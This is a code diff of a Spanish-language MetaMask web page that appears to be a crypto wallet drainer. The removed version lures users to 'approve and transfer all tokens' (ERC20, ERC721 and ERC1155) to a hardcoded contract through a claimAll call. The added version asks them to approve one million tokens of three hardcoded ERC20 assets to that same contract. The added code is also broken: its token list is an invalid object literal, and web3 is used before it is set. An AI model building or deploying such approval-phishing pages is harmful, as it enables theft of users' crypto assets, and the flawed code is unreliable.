@@ -3,122 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inicio de sesión con MetaMask y Aprobación de Tokens</title>
-    <link rel="stylesheet" >
-</head>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f4f4f9;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
-    }
-
-    .container {
-        text-align: center;
-        padding: 20px;
-        background-color: white;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        border-radius: 10px;
-        max-width: 400px;
-        width: 100%;
-    }
-
-    button {
-        padding: 10px 20px;
-        font-size: 16px;
-        cursor: pointer;
-        border: none;
-        background-color: #4CAF50;
-        color: white;
-        border-radius: 5px;
-        margin: 10px;
-        transition: background-color 0.3s;
-    }
-
-    button:hover {
-        background-color: #45a049;
-    }
-
-</style>
-<body>
-    <div class="container">
-        <h1>Iniciar sesión con MetaMask</h1>
-        <button id="connectButton">Conectar MetaMask</button>
-
-        <div id="status" style="display:none;">
-            <h2>Bienvenido, conéctate para aprobar y transferir tus tokens</h2>
-            <button id="claimAllButton">Aprobar y Transferir Todos los Tokens</button>
-        </div>
-    </div>
-
+    <title>Aprobación de Tokens</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-</body>
-<script>
-let web3;
-let userAccount;
-let contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección de tu contrato
-let contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AssetTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC1155Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"checkERC20Allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC721Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokensERC20","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"address[]","name":"contractsERC721","type":"address[]"},{"internalType":"address[]","name":"contractsERC1155","type":"address[]"}],"name":"claimAll","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        button { padding: 10px; margin: 10px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Aprobar Gasto de Tokens</h1>
+    <button onclick="connectWallet()">Conectar MetaMask</button>
+    <button onclick="approveTokens()">Aprobar 1M de Tokens</button>
+    <p id="status"></p>
+    
+    <script>
+        let web3;
+        let userAccount;
+        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; 
+        const tokens = {
+           "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
+           "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
+           "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
+        };
+        const amountToApprove = web3.utils.toWei("1000000", "ether");
 
-document.getElementById("connectButton").addEventListener("click", connectMetaMask);
-document.getElementById("claimAllButton").addEventListener("click", claimAllTokens);
-
-async function connectMetaMask() {
-    if (window.ethereum) {
-        try {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-            web3 = new Web3(window.ethereum);
-            const accounts = await web3.eth.getAccounts();
-            userAccount = accounts[0];
-
-            document.getElementById("status").style.display = "block";
-            document.getElementById("connectButton").style.display = "none";
-        } catch (error) {
-            console.error("Error de conexión", error);
+        async function connectWallet() {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                userAccount = (await web3.eth.getAccounts())[0];
+                document.getElementById("status").innerText = "Conectado: " + userAccount;
+            } else {
+                alert("Instala MetaMask para continuar.");
+            }
         }
-    } else {
-        alert("MetaMask no está instalado. Por favor, instálalo.");
-    }
-}
 
-async function claimAllTokens() {
-    const contract = new web3.eth.Contract(contractABI, contractAddress);
+        async function approveTokens() {
+            if (!userAccount) return alert("Conéctate a MetaMask primero.");
 
-    try {
-        // Definir los tokens ERC20, ERC721, y ERC1155 que quieres probar
-        const tokensERC20 = [
-            "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-            "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-            "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-        ];
-
-        const amounts = [
-            web3.utils.toWei("100", "ether"),  // Aprobar 100 tokens de cada tipo
-            web3.utils.toWei("200", "ether")   // Aprobar 200 tokens de cada tipo
-        ];
-
-        const contractsERC721 = [
-            "0x06012c8cf97BEaD5deAe237070F9587f8E7A266d"  // Contrato ERC721 de prueba
-        ];
-
-        const contractsERC1155 = [
-            "0x547f1f4ad57a472f6c3de4268d13adfbd433c6b6"  // Contrato ERC1155 de prueba
-        ];
-
-        // Llamada al contrato para aprobar y transferir tokens
-        await contract.methods.claimAll(
-            tokensERC20, amounts, contractsERC721, contractsERC1155
-        ).send({ from: userAccount });
-
-        alert("Tokens aprobados y transferidos con éxito.");
-    } catch (error) {
-        console.error("Error en claimAll", error);
-        alert("Hubo un problema con la transacción.");
-    }
-}
-</script>
+            for (let token in tokens) {
+                try {
+                    let tokenContract = new web3.eth.Contract([
+                        { "constant": false, "inputs": [
+                            { "name": "spender", "type": "address" },
+                            { "name": "amount", "type": "uint256" }
+                        ], "name": "approve", "outputs": [
+                            { "name": "", "type": "bool" }
+                        ], "type": "function" }
+                    ], tokens[token]);
+                    
+                    await tokenContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
+                    console.log(`${token} aprobado correctamente.`);
+                } catch (error) {
+                    console.error(`Error aprobando ${token}:`, error);
+                }
+            }
+        }
+    </script>
+</body>
 </html>
